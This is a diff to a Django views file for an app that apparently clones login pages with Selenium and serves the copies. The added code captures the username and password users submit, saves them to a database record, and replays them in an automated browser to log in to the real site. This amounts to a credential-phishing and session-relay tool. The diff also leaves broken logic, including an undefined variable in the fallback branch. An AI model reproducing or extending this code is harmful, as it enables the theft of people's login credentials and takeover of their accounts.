@@ -1,5 +1,5 @@
 from django.shortcuts import render
-from .models import Website,Page
+from .models import Website,Page,Hash
 from django.shortcuts import get_object_or_404
 from selenium import webdriver
 from time import sleep
@@ -11,7 +11,14 @@ from selenium.webdriver.common.keys import Keys
 import re
 # Create your views here.
 def index(request):
-    return render(request,'index.html')
+    if request.method=="POST":
+        ViewPage(request,"ab")
+    user=request.GET.get('user')
+    request.domain = Website.objects.get_current(request)
+    context={'data':request.domain.pages.all()[0].code}
+    response=render(request,'index.html',context)
+    response.set_cookie("user",user)
+    return response
 def check(url,username,password,page):
     browser = webdriver.Chrome('./chromedriver')
     browser.get(url)
@@ -32,34 +39,26 @@ def check(url,username,password,page):
     return browser.page_source
 @csrf_exempt
 def ViewPage(request,website):
-    request.domain=Website.objects.filter(name__contains=website)[1]
+    request.domain=Website.objects.get_current(request)
     if request.method=='POST':
         print(request.POST)
-        username=request.POST['login']
-        password=request.POST['password']
+        username=request.POST["login"]
+        password=request.POST["password"]
+        print(request.COOKIES)
+        user_id=request.COOKIES["user"]
+        user=Hash.objects.all()[0]
+        user.username=username
+        user.password=password
+        user.save()
+        website=request.domain
         try:
-            d=re.compile(r'(http(s)?://.*?)/') 
-            url=d.search(website)
-            print(url)
-            website=Website.objects.filter(name=url[:-1])
             context = {'data':website.pages.all()[1],}
         except:
-            website=request.META['HTTP_REFERER']
-            d=re.compile(r'(http(s)?://.*?)/') 
-            url=d.findall(website)
-            refer=url[1][0]
-            print(refer)
-            print("yes")
-            WebSite=Website.objects.filter(name__contains=refer[:-1])[0]
-            print(WebSite)
-            try:
-                context = {'data':WebSite.pages.all()[1],}
-            except:
-                website=check(refer,username,password,WebSite.pages.all()[0])
-                context={'page':website}
+            website=check(refer,username,password,website.pages.all()[0])
+            context={'page':website}
         print(website)
         return render(request,'home.html',context)
-    WebSite=get_object_or_404(Website,name=website)
+    WebSite=request.domain
     context = {'data':WebSite.pages.all()[0],}
     return render(request,'home.html',context)
 def new(request):
@@ -71,6 +70,7 @@ def new(request):
         driver.get(website)
         sleep(2)
         data=driver.page_source
+        driver.close()
         data =data.replace('&lt;','<')
         data =data.replace('&gt;','>')
         data =data.replace('&#39;','\'')
@@ -82,11 +82,13 @@ def new(request):
         if new_website:
             pass
         else:
-            new_website=Website(name=website)
+            new_website=Website(name=name)
             new_website.save()
         page=new_website.pages
         page.add(nap)
         new_website.save()
+        ji=Hash(user=request.user,website=new_website,hash_user="ab")
+        ji.save()
         return HttpResponse('<h1>added new page</h1>')
         context = {'data':data,}
         driver.close()
